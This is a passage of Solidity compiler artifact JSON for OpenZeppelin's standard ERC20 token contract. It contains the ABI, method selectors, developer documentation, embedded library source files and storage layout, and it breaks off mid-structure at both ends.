`value`."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"allowance(address,address)":"dd62ed3e","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","decimals()":"313ce567","name()":"06fdde03","symbol()":"95d89b41","totalSupply()":"18160ddd","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification.\",\"errors\":{\"ERC20InsufficientAllowance(address,uint256,uint256)\":[{\"details\":\"Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\",\"params\":{\"allowance\":\"Amount of tokens a `spender` is allowed to operate with.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC20InsufficientBalance(address,uint256,uint256)\":[{\"details\":\"Indicates an error related to the current `balance` of a `sender`. Used in transfers.\",\"params\":{\"balance\":\"Current balance for the interacting account.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC20InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC20InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC20InvalidSpender(address)\":[{\"details\":\"Indicates a failure with the `spender` to be approved. Used in approvals.\",\"params\":{\"spender\":\"Address that may be allowed to operate on tokens without being their owner.\"}}]},\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"constructor\":{\"details\":\"Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction.\"},\"decimals()\":{\"details\":\"Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}.\"},\"name()\":{\"details\":\"Returns the name of the token.\"},\"symbol()\":{\"details\":\"Returns the symbol of the token, usually a shorter version of the name.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least `value`.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":\"ERC20\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"./IERC20.sol\\\";\\nimport {IERC20Metadata} from \\\"./extensions/IERC20Metadata.sol\\\";\\nimport {Context} from \\\"../../utils/Context.sol\\\";\\nimport {IERC20Errors} from \\\"../../interfaces/draft-IERC6093.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * The default value of {decimals} is 18. To change this, you should override\\n * this function so it returns a different value.\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the EIP may not emit\\n * these events, as it isn't required by the specification.\\n */\\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\\n    mapping(address account => uint256) private _balances;\\n\\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n\\n    string private _name;\\n    string private _symbol;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the default value returned by this function, unless\\n     * it's overridden.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `value`.\\n     */\\n    function transfer(address to, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `value`.\\n     * - the caller must have allowance for ``from``'s tokens of at least\\n     * `value`.\\n     */\\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, value);\\n        _transfer(from, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _transfer(address from, address to, uint256 value) internal {\\n        if (from == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        if (to == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\\n     * this function.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _update(address from, address to, uint256 value) internal virtual {\\n        if (from == address(0)) {\\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\\n            _totalSupply += value;\\n        } else {\\n            uint256 fromBalance = _balances[from];\\n            if (fromBalance < value) {\\n                revert ERC20InsufficientBalance(from, fromBalance, value);\\n            }\\n            unchecked {\\n                // Overflow not possible: value <= fromBalance <= totalSupply.\\n                _balances[from] = fromBalance - value;\\n            }\\n        }\\n\\n        if (to == address(0)) {\\n            unchecked {\\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\\n                _totalSupply -= value;\\n            }\\n        } else {\\n            unchecked {\\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\\n                _balances[to] += value;\\n            }\\n        }\\n\\n        emit Transfer(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\\n     * Relies on the `_update` mechanism\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _mint(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(address(0), account, value);\\n    }\\n\\n    /**\\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\\n     * Relies on the `_update` mechanism.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead\\n     */\\n    function _burn(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        _update(account, address(0), value);\\n    }\\n\\n    /**\\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     *\\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\\n     */\\n    function _approve(address owner, address spender, uint256 value) internal {\\n        _approve(owner, spender, value, true);\\n    }\\n\\n    /**\\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\\n     *\\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\\n     * `Approval` event during `transferFrom` operations.\\n     *\\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\\n     * true using the following override:\\n     * ```\\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\\n     *     super._approve(owner, spender, value, true);\\n     * }\\n     * ```\\n     *\\n     * Requirements are the same as {_approve}.\\n     */\\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\\n        if (owner == address(0)) {\\n            revert ERC20InvalidApprover(address(0));\\n        }\\n        if (spender == address(0)) {\\n            revert ERC20InvalidSpender(address(0));\\n        }\\n        _allowances[owner][spender] = value;\\n        if (emitEvent) {\\n            emit Approval(owner, spender, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\\n     *\\n     * Does not update the allowance value in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Does not emit an {Approval} event.\\n     */\\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            if (currentAllowance < value) {\\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\\n            }\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - value, false);\\n            }\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xc3e1fa9d1987f8d349dfb4d6fe93bf2ca014b52ba335cfac30bfe71e357e6f80\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\",\"keccak256\":\"0xaa761817f6cd7892fcf158b3c776b34551cde36f48ff9703d53898bc45a94ea2\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":307,"contract":"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","label":"_balances","offset":0,"slot":"0","type":"t_mapping(t_address,t_uint256)"},{"astId":313,"contract":"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","label":"_allowances","offset":0,"slot":"1","type":"t_mapping(t_address,t_mapping(t_address,t_uint256))"},{"astId":315,"contract":"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","label":"_totalSupply","offset":0,"slot":"2","type":"t_uint256"},{"astId":317,"contract":"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","label":"_name","offset":0,"slot":"3","type":"t_string_storage"},{"astId":319,"contract":"@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","label":"_symbol","offset":0,"slot":"4","type":"t_string_storage"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_mapping(t_address,t_mapping(t_address,t_uint256))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(address => 